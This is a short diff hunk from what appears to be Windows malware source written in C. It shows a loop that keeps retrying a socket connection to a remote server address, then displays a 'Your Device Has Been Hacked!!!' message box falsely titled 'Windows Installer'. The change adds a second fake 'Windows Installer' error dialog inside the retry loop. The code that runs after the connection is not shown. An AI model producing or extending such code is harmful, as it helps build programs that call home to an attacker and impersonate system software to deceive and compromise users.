@@ -159,6 +159,8 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int 
 	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
 	{
 		Sleep(10);
+		 MessageBox(NULL, TEXT("Jdhafjs"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
+
 		goto start;
 	}
 	MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);
